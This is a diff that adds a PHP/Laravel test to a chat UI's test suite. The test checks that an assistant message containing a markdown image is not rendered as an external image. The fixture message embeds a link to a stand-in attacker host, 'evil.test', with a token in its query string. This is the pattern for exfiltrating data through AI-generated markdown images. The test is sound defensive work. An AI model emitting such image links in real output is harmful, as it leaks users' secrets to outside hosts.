@@ -433,6 +433,29 @@ class ChatUiTest extends TestCase
             ]);
     }
 
+    public function test_assistant_markdown_image_is_not_rendered_as_external_image(): void
+    {
+        $user = User::factory()->create();
+        $conversation = Conversation::create([
+            'user_id' => $user->id,
+            'title' => 'Markdown image security',
+        ]);
+        Message::create([
+            'conversation_id' => $conversation->id,
+            'role' => 'assistant',
+            'content' => 'Aman ![secret](https://evil.test/leak.png?data=token) dan [tautan](https://example.com).',
+        ]);
+
+        $response = $this->actingAs($user)->get(route('chat', $conversation));
+
+        $response->assertOk();
+        $html = (string) $response->getContent();
+
+        $this->assertStringContainsString('tautan', $html);
+        $this->assertStringNotContainsString('src="https://evil.test', $html);
+        $this->assertStringNotContainsString('src=\"https:\/\/evil.test', $html);
+    }
+
     public function test_chat_page_renders_multiline_and_document_feedback_hooks(): void
     {
         $user = User::factory()->create();
